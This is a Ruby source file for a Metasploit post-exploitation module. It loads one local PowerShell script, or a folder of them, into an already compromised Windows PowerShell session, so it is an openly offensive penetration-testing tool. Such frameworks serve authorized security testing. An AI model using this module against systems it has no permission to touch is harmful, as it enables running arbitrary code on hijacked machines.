##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Load Scripts Into PowerShell Session",
      'Description'          => %q{
        This module will download and execute one or more PowerShell script
        s over a present powershell session.
        Setting VERBOSE to true will show the stager results.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['powershell'],
      'Author'        => [
          'Ben Turner benpturner[at]yahoo.com',
          'Dave Hardy davehardy20[at]gmail.com'
        ]
    ))

    register_options(
      [
        OptPath.new( 'SCRIPT',  [false, 'Path to the local PS script', ::File.join(Msf::Config.install_root, "scripts", "ps", "msflag.ps1") ]),
        OptPath.new( 'FOLDER',  [false, 'Path to a local folder of PS scripts'])
      ])

  end

  def run
    if datastore['SCRIPT']
      stage_psh_env(datastore['SCRIPT'])
    end
    if datastore['FOLDER']
      files = ::Dir.entries(datastore['FOLDER'])
      files.reject! { |u| %w(. ..).include?(u) }
      files.each do |script| stage_psh_env(datastore['FOLDER'] + script) end
    end
  end
end
